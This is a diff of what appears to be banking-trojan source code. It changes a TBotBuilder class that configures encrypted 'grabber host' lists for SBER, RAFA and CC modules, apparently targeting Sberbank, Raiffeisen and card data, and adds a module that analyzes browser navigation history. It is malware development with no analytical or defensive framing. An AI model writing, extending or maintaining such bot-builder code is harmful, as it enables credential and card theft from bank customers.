@@ -19,6 +19,7 @@
 #include "Sber.h"
 #include "Rafa.h"
 #include "cc.h"
+#include "HistoryAnalizer.h"
 
 //---------------------------------------------------------------------------
 
@@ -696,12 +697,17 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module = AddModule(Module_SberHosts);
 	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");
 
-
+    // Настройки параметров рафы
 	Module = AddModule(Module_RafaHosts);
 	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");
 
+	// Настройки системы CC
 	Module = AddModule(Module_CCHosts);
 	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
+
+	// Настройки анализатора истории навигации
+	Module = AddModule(Module_HistoryAnalyzer);
+	Module->AddParam(true, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, "Ссылки анализатора истории навигации");
 }
 
 
